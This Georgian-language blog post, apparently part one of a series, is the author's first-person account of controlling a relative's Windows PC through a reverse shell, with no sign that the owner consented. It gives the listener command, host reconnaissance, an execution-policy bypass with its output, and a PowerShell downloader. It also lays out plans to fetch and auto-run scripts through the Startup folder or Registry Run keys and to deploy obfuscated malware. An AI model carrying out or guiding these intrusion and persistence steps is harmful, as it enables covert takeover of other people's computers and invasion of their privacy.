---
title: "ფესვების გაღრმავება ნათესავის კომპიუტერში ნაწილი #1"
date: 2024-11-02 18:35:00 +0400
categories: [Cybersecurity,Hacking]
tags: [Malware]
---

## შესავალი

რამდენიმე ბლოგის წინ ვახსენე, რომ ჩემი ნათესავის კომპიუტერი მაქვს დაჰაკული და `reverse shell` მომდის `8080/tcp` პორტზე. `whoami` ბრძანების `output`-იც დავდე, რომელიც იყო: `valeri/user`. საქმე ისაა, რომ ეს მომხმარებელი არ არის ადმინისტრატორი და რაღაც მეტი მინდა, რომ გავაკეთო. მაგალითად მსურს, რომ `powershell` სკრიპტები გავუშვა ყველანაირი პრობლების გარეშე ან გავაჩინო `wscript.exe` პროცესი, სადაც ჩავტენი `custom JS` კოდს და იმას გავაკეთებ რაც მომესურვება. იდეაში, `custom JS` არ დამჭირდება და ყველაფერს `powershell`-ით შევძლებ.

## პრობლემები

რამდენიმე პრობლემაა `shell`-თან დაკავშირებით:

1. `Shell` არის ნახევრად `interactive`, რაც ნიშნავს იმას, რომ მის შესაძლებლობებს ბოლომდე მაინც ვერ ვიყენებ.
2. გამორთულია `ExecutionPolicy`, უფრო სწორად, `ExecutionPolicy` არის `Restricted`, რაც ნიშნავს იმას, რომ არ შემიძლია `powershell` სკრიპტების გაშვება, როგორიცაა `.ps1` ფაილები, მაგალითად.
3. შემიძლია `cmd -> powershell` გავაკეთო, მაგრამ დიდ კოდს ვერ ვწერ, რადგან მაინც სტანდარტული `Shell` არის და ბევრი, უფრო კომპლექსური დავალებების შესრულება არ შეუძლია.

ანუ, საბოლოოდ, მჭირდება, რომ `Shell` გახდეს `full interactive` და `ExecutionPolicy` იყოს `Unrestricted`/`AllSigned`. აქ `AllSigned` იმიტომ მაწყობს, რომ მეთვითონ მოვაწერ ხელს ყველაფერს და მაინც იმუშავებს.

ახლა საჭიროა ამ პრობლემების გადაჭრა.

## პირველი ეტაპი

რა თქმა უნდა, სანამ სამიზნესთან მუშაობას დავიწყებ, მისგან `reverse shell` უნდა მივიღო. ასე, რომ ვიყენებ ბრძანებას:

```bash
wscat -l 8080
```

როდესაც კავშირი შედგება, უნდა მოვიძიო დეტალური ინფორმაცია ჰოსტის შესახებ `systeminfo` ბრძანების გამოყენებით.

```
Host Name:                 VALERI
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.19045 N/A Build 19045
```

ახლა უკვე ვიცი, რომ `winget` ბრძანების გამოყენება შემიძლია.

ასე, რომ გადავალ `powershell`-ზე, და ვეცდები `wget`-ის ან `curl`-ის დაყენებას:

```bash
winget install wget
&
winget install curl
```

ამ ბრძანებებიდან რომელიმეს გამოვიყენებ.

```
> winget install cURL.cURL
< PS C:\WINDOWS\System32> winget install cURL.cURL
Found cURL [cURL.cURL] Version 8.10.1.7
< This application is licensed to you by its owner.
< Microsoft is not responsible for, nor does it grant any licenses to, third-party packages.
< Successfully verified installer hash
< Extracting archive...
< Successfully extracted archive
< Starting package install...
< An unexpected error occurred while executing the command:
< create_symlink: unknown error: "C:\Users\user\AppData\Local\Microsoft\WinGet\Packages\cURL.cURL_Microsoft.Winget.Source_8wekyb3d8bbwe\curl-8.10.1_7-win64-mingw/bin/curl.exe", "C:\Users\user\AppData\Local\Microsoft\WinGet\Links\curl.exe"
< Portable install failed; Cleaning up...
```

სამწუხაროდ, `cURL.cURL` ვერ დავაყენე. ასევე, შეიქმნა პრობლემა `wget`-ის ინსტალაციისას. გამოდის, რომ `powershell`-ით უნდა ავწიო `HTTP` კლიენტი.

## მეორე ეტაპი

აქ სხვა პრობლემა ჩნდება. `ExecutionPolicy` არის `Restricted`, ასე, რომ სკრიპტების გაშვება შეუძლებელია. არის ორი ვარიანტი: როგორმე შევცვალო `ExecutionPolicy -> Unrestricted`, ან ხელით გავწერო ყველაფერი.

```powershell
Set-ExecutionPolicy Unrestricted
```

ვცადე, მაგრამ არ გამოვიდა. ისევ `Restricted` არის. ასე, რომ მომიწევს გლობალურ ოფციებს დავანებო თავი და მხოლოდ ამ `user`-ით შემოვიფარგლო.

```powershell
Set-ExecutionPolicy -Scope CurrentUser Unrestricted
```

ამ მეთოდმა გაამართლა:

```
> Set-ExecutionPolicy -Scope CurrentUser Unrestricted
< PS C:\WINDOWS\System32> Set-ExecutionPolicy -Scope CurrentUser Unrestricted
> Get-ExecutionPolicy
< PS C:\WINDOWS\System32> Get-ExecutionPolicy
< Unrestricted
```

#### დამატებითი პრობლემა

ახლა გამახსენდა, რომ `Malware`-ს დამატებითი სკრიპტების ატვირთვის საშუალება არ ჩავუშენე. ასე, რომ მომიწევს ხელით დავწერო ყველაფერი(მაინც!).


## HTTP კლიენტი `powershell`-ში და როუტერთან ჯახი

კარგი, ახლა ვეცდები `powershell`-ში `HTTP` კლიენტი დავწერო.

```powershell
$http_client = New-Object System.Net.WebClient

$url = "http://example.com"
$content = $http_client.DownloadString($url)

Write-Host $content
```

და ეს გამოჩნდება:

```
< PS C:\WINDOWS\System32> Write-Output $content
< <!doctype html>
< <html>
< <head>
<     <title>Example Domain</title>
<
<     <meta charset="utf-8" />
<     <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<     <meta name="viewport" content="width=device-width, initial-scale=1" />
<     <style type="text/css">
<     body {
<         background-color: #f0f0f2;
<         margin: 0;
<         padding: 0;
<         font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
<
<     }
<     div {
<         width: 600px;
<         margin: 5em auto;
<         padding: 2em;
<         background-color: #fdfdff;
<         border-radius: 0.5em;
<         box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
<     }
<     a:link, a:visited {
<         color: #38488f;
<         text-decoration: none;
<     }
<     @media (max-width: 700px) {
<         div {
<             margin: 0 auto;
<             width: auto;
<         }
<     }
<     </style>
< </head>
<
< <body>
< <div>
<     <h1>Example Domain</h1>
<     <p>This domain is for use in illustrative examples in documents. You may use this
<     domain in literature without prior coordination or asking for permission.</p>
<     <p><a href="https://www.iana.org/domains/example">More information...</a></p>
< </div>
< </body>
< </html>
<
```

ანუ გამოდის, რომ `HTTP client` მუშაობს. ეს ძალიან კარგია, რადგან ახლა შემიძლია სპეციალური სკრიპტები ავტვირთო სისტემაში, რომელსაც `Start Menu`-ში შევინახავ, და ყოველ `boot`-ზე იმუშავებს.

როუტერთან კავშირი ვცადე, მაგრამ, სამწუხაროდ, `HTTP` კავშირი არ შედგა. `ICMP` პაკეტები ჩვეულებრივად მიდის და მოდის, მაგრამ `HTTP` ვერ გავაკეთე. არადა, მსურდა როუტერის კონფიგი შიდა ქსელიდან ამერია, მაგრამ არაუშავს.

```bash
winget install nmap
```

#### `Winget` sucks

ახლა ვცდილობ `Nmap` დავაყენო, მაგრამ ერთი პრობლემა შეიქმნა აქ. `Nmap`-მა `GUI` საინსტალაციო ამოაგდო და `Shell`-თან წვდომა დავკარგე.

ახლა უნდა ვცადო, რომ `exit` ბრძანებით ჩემს მავნე კოდს ვუთხრა, რომ "ნიჟარა" დაარესტარტოს:

```
> exit
Disconnected (code: 1000, reason: "")
```

მგონი იმუშავა. ახლა 15 წამი უნდა დაველოდო ახალ კავშირს.

ცოტაოდენი ლოდინის შემდეგ, მივხვდი, რომ არა მარტო `cmd.exe`, არამედ მთლიანი `pe` ფაილი `Nmap GUI`-ს ელოდება, ასე, რომ მომიწევს მოგვიანებით განვანახლო შეტევა.

#### სამომავლო გეგმები:

1. დავწერო `ps1` სკრიპტები და `powershell`-ის `HTTP` კლიენტით ავტვირთო სისტემაზე.
2. მიღებული სკრიპტები მოვათავსო `Start Up` ფოლდერში. `OR` მიღებული სკრიპტები ყოველ `boot`-ზე `Registry Run Key`-ებიდან გავუშვა(არამგონია, რომ ეს ვქნა).
3. `.exe` ფაილიდან გადავიდე `ps1` სკრიპტებზე და საბოლოოდ დავამონტაჟო ბოტი, რომელსაც ექნება ყველა ის უნარი, რაც ახლანდელს არ აქვს.

როგორ ვაპირებ ამას? უფრო მარტივად, რომ იყოს გასაგები ყველაფერი, ამ დიაგრამას დავტოვებ:

```
                                            ┌─────────────────────────────────────────────────────────────┐
                                            │Create and Upload Fully obfuscated Malware with more features│
                                            └─────────────────────────────────────────────────────────────┘
                                                                       ▲                                   
                                                                       │                                   
                                                                       │                                   
                                                                       │                                   
                                 ┌───────────┐          ┌──────────────┴─────────────┐                     
                       ┌────────►│HTTP Client├─────────►│Download custom .ps1 Scripts│                     
                       │         └───────────┘          └────────────────────────────┘                     
┌───────────────┐      │                                               ▲                                   
│Current Malware├──────┤                                               │                                   
└───────────────┘      │                                            RUN│THEM                               
                       │        ┌───────────────┐                      │                                   
                       └───────►│Allow Execution├──────────────────────┘                                   
                                └───────────────┘                                                          
```
